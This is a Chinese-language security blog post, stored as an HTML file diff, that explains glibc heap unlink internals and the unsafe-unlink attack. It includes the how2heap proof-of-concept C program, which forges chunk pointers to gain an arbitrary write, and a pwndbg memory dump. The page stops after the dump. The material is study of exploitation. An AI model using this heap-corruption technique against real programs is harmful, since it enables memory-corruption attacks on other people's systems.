@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="经典漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="unsafe-unlink">
+<meta property="og:url" content="https://ha0-y.github.io/2023/09/13/unsafe-unlink/index.html">
+<meta property="og:site_name" content="h4m5ter">
+<meta property="og:description" content="经典漏洞">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-09-13T02:33:44.063Z">
+<meta property="article:modified_time" content="2024-04-29T09:36:00.623Z">
+<meta property="article:author" content="h4m5ter">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>unsafe-unlink</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Ha0-Y">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/09/16/CTF%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/09/09/Cmake%E4%BD%BF%E7%94%A8/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ha0-y.github.io/2023/09/13/unsafe-unlink/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ha0-y.github.io/2023/09/13/unsafe-unlink/&text=unsafe-unlink"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ha0-y.github.io/2023/09/13/unsafe-unlink/&title=unsafe-unlink"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ha0-y.github.io/2023/09/13/unsafe-unlink/&is_video=false&description=unsafe-unlink"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=unsafe-unlink&body=Check out this article: https://ha0-y.github.io/2023/09/13/unsafe-unlink/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ha0-y.github.io/2023/09/13/unsafe-unlink/&title=unsafe-unlink"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ha0-y.github.io/2023/09/13/unsafe-unlink/&title=unsafe-unlink"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ha0-y.github.io/2023/09/13/unsafe-unlink/&title=unsafe-unlink"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ha0-y.github.io/2023/09/13/unsafe-unlink/&title=unsafe-unlink"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ha0-y.github.io/2023/09/13/unsafe-unlink/&name=unsafe-unlink&description=&lt;blockquote&gt;
+&lt;p&gt;经典漏洞&lt;/p&gt;
+&lt;/blockquote&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ha0-y.github.io/2023/09/13/unsafe-unlink/&t=unsafe-unlink"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Glibc-unlink"><span class="toc-number">1.</span> <span class="toc-text">Glibc unlink</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attack"><span class="toc-number">2.</span> <span class="toc-text">Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#uaf"><span class="toc-number">2.1.</span> <span class="toc-text">uaf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsafe-unlink"><span class="toc-number">2.2.</span> <span class="toc-text">unsafe unlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#off-by-null"><span class="toc-number">2.3.</span> <span class="toc-text">off by null</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kernel"><span class="toc-number">3.</span> <span class="toc-text">kernel ?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">4.</span> <span class="toc-text">参考文章</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        unsafe-unlink
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">h4m5ter</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-09-13T02:33:44.063Z" class="dt-published" itemprop="datePublished">2023-09-13</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categorievariants/CSE/">CSE</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <blockquote>
+<p>经典漏洞</p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="Glibc-unlink"><a href="#Glibc-unlink" class="headerlink" title="Glibc unlink"></a>Glibc unlink</h2><p>当一个 free chunk 从双向链表的 bins 中取出时（堆的合并），这个过程就是 unlink。</p>
+<p>堆的合并主要看这一段代码，存在两种合并方式</p>
+<ul>
+<li>int_free 参数：p是正在free的chunk，av 指 arena(struct malloc_state)，lock避免条件竞争</li>
+<li>向后合并：prev_inuse位为0，会发生unsorted bin之间合并，会检查prev_size 和 想要合并的 bin 的 size 是否相同。unlink prev_chunk</li>
+<li>向前合并：不是top_chunk, unlink nextchunk。</li>
+<li>至于方向：在没有翻译错误的情况下，有点绕，但是可以强行解释，因为堆往高地址生长，向前就是向高地址合并，向后就是向低地址合并？</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> inuse_bit_at_offset(p, s)					      \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">prev_inuse</span>(p)) &#123;</span><br><span class="line">  prevsize = <span class="built_in">prev_size</span>(p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = <span class="built_in">chunk_at_offset</span>(p, -((<span class="type">long</span>)prevsize));         <span class="comment">// p = p-prevsize,就是前面的 chunk</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">chunksize</span>(p) != prevsize))</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  <span class="built_in">unlink_chunk</span>(av, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// nextchunk = chunk_at_offset(p, size);  就是根据size进行加法，是一个宏，就是当前chunk的下一个chunk</span></span><br><span class="line"><span class="comment">// nextsize = chunksize(nextchunk); </span></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">  nextinuse = <span class="built_in">inuse_bit_at_offset</span>(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* consolidate forward */</span></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">  <span class="built_in">unlink_chunk</span>(av, nextchunk);    <span class="comment">// 当前的 arena 和 next_chunk 使用指针连接</span></span><br><span class="line">  size += nextsize;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">  <span class="built_in">clear_inuse_bit_at_offset</span>(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+<p>unlink函数主要是指针的处理，假设3个chunk，a-b-c，a-b在unsortedbin 范围，c主要防止top_chunk合并，正常情况下</p>
+<ul>
+<li>首先，unsorted bin 按照free时间顺序连接，fd指向时间靠前的chunk。</li>
+<li>向前合并：free b, free a。先成为 arena&lt;-&gt;b 双链表，然后在调用 unlink(av, b)。</li>
+<li>向后合并：free a, free b。先成为 arena&lt;-&gt;a 双链表 在int_free 调用的是 unlink(av, a)。</li>
+<li>这里就使用向后合并举例：fd&#x3D;a-&gt;fd&#x3D;arena, bk&#x3D;a-&gt;bk&#x3D;arena；在经历一个赋值语句变为 arena-&gt;bk&#x3D;arena，areba-&gt;fd&#x3D;arena。从arena&lt;-&gt;a 变成了 arena 完成unlink此操作。</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">unlink_chunk</span><span class="params">(mstate av, mchunkptr p)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">chunksize</span>(p) != <span class="built_in">prev_size</span>(<span class="built_in">next_chunk</span>(p)))</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">in_smallbin_range</span>(<span class="built_in">chunksize_nomask</span>(p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">      <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">        fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">        fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">        p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">        p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">      p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后后续继续进入free函数里操作</p>
+<ul>
+<li>后续操作：此时p指向a，找到arena的bins数组，然后链入arena，设置head和foot</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="comment">// 设置size罢了</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="comment">// 设置下一个chunk的prev_size</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span></span><br><span class="line"></span><br><span class="line">bck = <span class="built_in">unsorted_chunks</span>(av);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">  <span class="built_in">malloc_printerr</span>(<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">p-&gt;fd = fwd;</span><br><span class="line">p-&gt;bk = bck;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">in_smallbin_range</span>(size)) &#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">bck-&gt;fd = p;</span><br><span class="line">fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set_head</span>(p, size | PREV_INUSE);</span><br><span class="line"><span class="built_in">set_foot</span>(p, size);</span><br><span class="line"></span><br><span class="line"><span class="built_in">check_free_chunk</span>(av, p);</span><br></pre></td></tr></table></figure>
+
+<p>最后：arena的bins数组存放数据：</p>
+<ul>
+<li>这样涉及就好像有fd，bk指针。</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bins[<span class="number">1</span>] = bins[<span class="number">0</span>] = &amp;bins - <span class="number">0x10</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>相关的攻击手段。</p>
+<h3 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h3><p>早期发现此漏洞时，没有 <code>fd-&gt;bk != p || bk-&gt;fd != p</code> 这个条件，因此直接修改 fd, bk 来进行任意地址写</p>
+<ul>
+<li>任意地址写，如果开了 got 表保护，可以写 hook。</li>
+</ul>
+<h3 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe unlink"></a>unsafe unlink</h3><p>在没有 PIE 和 got表可以写时，可以通过修改got表。其本质是一个heap overflow这是比较简单的。</p>
+<ul>
+<li>主要是利用 unlink 中的代码，其中指针赋值简化为 <code>p-&gt;fd-&gt;bk = p-&gt;bk, p-&gt;bk-&gt;fd = p-&gt;fd</code></li>
+<li>我们控制这个 p 的内容。</li>
+</ul>
+<ol>
+<li>按照时间 malloc A,B</li>
+<li>A 堆溢出，修改A的内容 修改B的header</li>
+</ol>
+<ul>
+<li>target &#x3D; &amp;p，需要我们可以写。或者 target就是p</li>
+<li>我们在 A 里伪造一个 fake free chunk: prev_inuse, size, <em>fd&#x3D;&amp;target-0x18, bk&#x3D;&amp;target&#x3D;0x10</em></li>
+<li>利用堆溢出修改 B 的header，让fake free chunk 和 B 可以合并。</li>
+</ul>
+<ol start="3">
+<li>free B 就会 unlink，<strong>p 就是 fake free chunk</strong>，触发unlink。</li>
+</ol>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+---------+                     +----------+ </span><br><span class="line">|         |                     |          |</span><br><span class="line">|    A    |                     +----------+                    </span><br><span class="line">|         |                     |          |  A中伪造 =&gt; fake heap head(sz, fd, bk) + data </span><br><span class="line">|         |                     |fake heap |</span><br><span class="line">|         |                     |          |</span><br><span class="line">+---------+  ==heap overflow===&gt;+----------+   ===========================&gt; free B =&gt; unlink</span><br><span class="line">|         |                     |ps     sz |</span><br><span class="line">|         |                     |          |  B head =&gt; prev size 过检查</span><br><span class="line">|   B     |                     |          |            prev_inuse 为0</span><br><span class="line">|         |                     |          |</span><br><span class="line">+---------+                     +----------+</span><br></pre></td></tr></table></figure>
+
+
+<p>how2heap 案例</p>
+<ul>
+<li>编译时指定no-pie</li>
+<li>测试在ubuntu 22.04，可以通过assert.</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> malloc_size = <span class="number">0x420</span>;</span><br><span class="line">  <span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  chunk0_ptr = (<span class="type">uint64_t</span> *)<span class="built_in">malloc</span>(malloc_size);            <span class="comment">// chunk0</span></span><br><span class="line">  <span class="type">uint64_t</span> *chunk1_ptr = (<span class="type">uint64_t</span> *)<span class="built_in">malloc</span>(malloc_size);  <span class="comment">// chunk1</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr,</span><br><span class="line">         chunk0_ptr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fake_head</span></span><br><span class="line">  chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fake fd &amp;&amp; fake bk</span></span><br><span class="line">  chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>)&amp;chunk0_ptr - (<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>) * <span class="number">3</span>);</span><br><span class="line">  chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>)&amp;chunk0_ptr - (<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>) * <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>, (<span class="type">void</span> *)chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// chunk1 的 header 指针</span></span><br><span class="line">  <span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">  <span class="comment">// chunk1 -&gt; prev_size</span></span><br><span class="line">  chunk1_hdr[<span class="number">0</span>] = malloc_size;   </span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been &quot;</span></span><br><span class="line">      <span class="string">&quot;0x430, however this is its new value: %p\n&quot;</span>,</span><br><span class="line">      (<span class="type">void</span> *)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// prev_inuse 为 0</span></span><br><span class="line">  chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// unlink 发生</span></span><br><span class="line">  <span class="comment">// chunk0_ptr-&gt;fd = &amp;chunk0_ptr-0x18</span></span><br><span class="line">  <span class="comment">// 修改chunk0_ptr 可以修改 *(chunk0_ptr - 0x18 )的值</span></span><br><span class="line">  <span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(victim_string, <span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">  chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>)victim_string;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>, victim_string);</span><br><span class="line">  chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>, victim_string);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  <span class="built_in">assert</span>(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>比较绕，但是可以直接看最后的结果，<code>chunk0_ptr-&gt;bk-&gt;fd = chunk0_ptr-&gt;fd</code>。target 的内容存放着 <code>&amp;target-0x10</code> target的地址减去0x18</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chunk0_ptr 堆地址</span></span><br><span class="line">pwndbg&gt; x/8xg 0x405290  </span><br><span class="line">0x405290:       0x0000000000000000      0x0000000000000431</span><br><span class="line">0x4052a0:       0x0000000000000000      0x0000000000020d61</span><br><span class="line">0x4052b0:       0x0000000000404050      0x0000000000404058    <span class="comment"># fake_fd fake_bk</span></span><br><span class="line">0x4052c0:       0x0000000000000000      0x0000000000000000</span><br><span class="line"></span><br><span class="line"><span class="comment"># &amp;chunk0_ptr</span></span><br><span class="line"><span class="comment"># (&amp;chunk0_ptr - 0x10) -&gt; fd = fake_fd</span></span><br><span class="line">pwndbg&gt; x/8xg 0x0000000000404058+0x10   </span><br><span class="line">0x404068 &lt;chunk0_ptr&gt;:  0x0000000000404050      0x0000000000000000</span><br><span class="line">0x404078:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x404088:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x404098:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
+
